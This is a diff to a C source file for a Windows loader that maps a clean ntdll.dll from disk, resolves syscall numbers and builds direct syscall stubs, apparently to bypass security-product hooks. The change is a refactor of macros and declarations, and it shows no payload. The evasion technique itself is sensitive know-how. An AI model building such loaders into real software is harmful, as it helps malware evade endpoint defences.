@@ -3,18 +3,16 @@
 
 #include "winapi_loader.h"
 
-/* ================= Macros ================= */
-#define SYSCALL_PREPARE(ctx, name)                  \
-    do {                                            \
-        g_ssn  = ResolveSSN(ctx, name);            \
-        g_stub = BuildDirectSyscallStub(ctx, g_ssn); \
-    } while (0)
+/* ================= Types ================= */
+typedef struct _NTDLL_DISK_CTX {
+    void  *base;
+    SIZE_T size;
+} NTDLL_DISK_CTX;
 
-#define SYSCALL_CALL(type) ((type)g_stub)
-
-#define LOAD_NTDLL \
-    NTDLL_DISK_CTX ntdll_ctx = MapNtdllFromDisk(); \
-    PVOID ntdll_base = ntdll_ctx.base;
+typedef enum _SECTION_INHERIT {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT;
 
 /* ================= Strings ================= */
 STRINGA(ntdll_dll, "ntdll.dll");
@@ -22,40 +20,30 @@ STRINGW(ntdll_path, "\\SystemRoot\\System32\\ntdll.dll");
 
 STRINGA(ntcreatefile, "NtCreateFile");
 STRINGA(ntcreatesection, "NtCreateSection");
-STRINGA(ntmapview, "NtMapViewOfSection");
+STRINGA(ntmapviewofsection, "NtMapViewOfSection");
 STRINGA(ntclose, "NtClose");
-STRINGA(ntallocvm, "NtAllocateVirtualMemory");
-STRINGA(ntprotectvm, "NtProtectVirtualMemory");
+STRINGA(ntallocatevirtualmemory, "NtAllocateVirtualMemory");
+STRINGA(ntprotectvirtualmemory, "NtProtectVirtualMemory");
 
-/* ================= Globals ================= */
-static DWORD g_ssn;
-static void *g_stub;
+/* ================= Macros ================= */
+#define LOAD_NTDLL \
+    NTDLL_DISK_CTX ntdll_ctx = MapNtdllFromDisk(); \
+    PVOID ntdll_base = ntdll_ctx.base; \
+    DWORD g_ssn = 0; \
+    void *g_stub = NULL
 
-/* ================= Types ================= */
-typedef enum _SECTION_INHERIT {
-    ViewShare = 1,
-    ViewUnmap = 2
-} SECTION_INHERIT;
+#define SYSCALL_PREPARE(name) \
+    do { \
+        g_ssn  = ResolveSSN(&ntdll_ctx, name); \
+        g_stub = BuildDirectSyscallStub(&ntdll_ctx, g_ssn); \
+    } while (0)
 
-typedef struct _NTDLL_DISK_CTX {
-    void  *base;
-    SIZE_T size;
-} NTDLL_DISK_CTX;
+#define SYSCALL_CALL(type) ((type)g_stub)
 
 /* ================= Disk-backed NTDLL ================= */
 static NTDLL_DISK_CTX MapNtdllFromDisk(void) {
     NTDLL_DISK_CTX ctx = {0};
-
-    NTSTATUS (NTAPI *NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
-    NTSTATUS (NTAPI *NtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
-    NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
-    NTSTATUS (NTAPI *NtClose)(HANDLE);
-
     HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
-    NtCreateFile = (void *)myGetProcAddress(ntdll, ntcreatefile);
-    NtCreateSection = (void *)myGetProcAddress(ntdll, ntcreatesection);
-    NtMapViewOfSection = (void *)myGetProcAddress(ntdll, ntmapview);
-    NtClose = (void *)myGetProcAddress(ntdll, ntclose);
 
     UNICODE_STRING us;
     InitUnicodeString(&us, ntdll_path);
@@ -65,15 +53,23 @@ static NTDLL_DISK_CTX MapNtdllFromDisk(void) {
 
     HANDLE hFile;
     IO_STATUS_BLOCK iosb;
+
+    NTSTATUS (NTAPI *NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG) =
+        (void *)myGetProcAddress(ntdll, ntcreatefile);
     NtCreateFile(&hFile, FILE_GENERIC_READ, &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
 
     HANDLE hSection;
+    NTSTATUS (NTAPI *NtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE) =
+        (void *)myGetProcAddress(ntdll, ntcreatesection);
     NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
 
     PVOID base = NULL;
     SIZE_T size = 0;
+    NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG) =
+        (void *)myGetProcAddress(ntdll, ntmapviewofsection);
     NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0, NULL, &size, ViewShare, 0, PAGE_READONLY);
 
+    NTSTATUS (NTAPI *NtClose)(HANDLE) = (void *)myGetProcAddress(ntdll, ntclose);
     NtClose(hSection);
     NtClose(hFile);
 
@@ -136,16 +132,13 @@ static DWORD ResolveSSN(NTDLL_DISK_CTX *ctx, const char *name) {
 
 /* ================= Direct syscall stub ================= */
 static void *BuildDirectSyscallStub(NTDLL_DISK_CTX *ctx, DWORD ssn) {
-    NTSTATUS (NTAPI *NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-    NTSTATUS (NTAPI *NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
-
-    HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
-    NtAllocateVirtualMemory = (void *)myGetProcAddress(ntdll, ntallocvm);
-    NtProtectVirtualMemory = (void *)myGetProcAddress(ntdll, ntprotectvm);
+    NTSTATUS (NTAPI *NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG) =
+        (void *)myGetProcAddress(myGetModuleHandleA(ntdll_dll), ntallocatevirtualmemory);
+    NTSTATUS (NTAPI *NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG) =
+        (void *)myGetProcAddress(myGetModuleHandleA(ntdll_dll), ntprotectvirtualmemory);
 
     PVOID base = NULL;
     SIZE_T size = 11;
-
     NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     BYTE *p = (BYTE *)base;
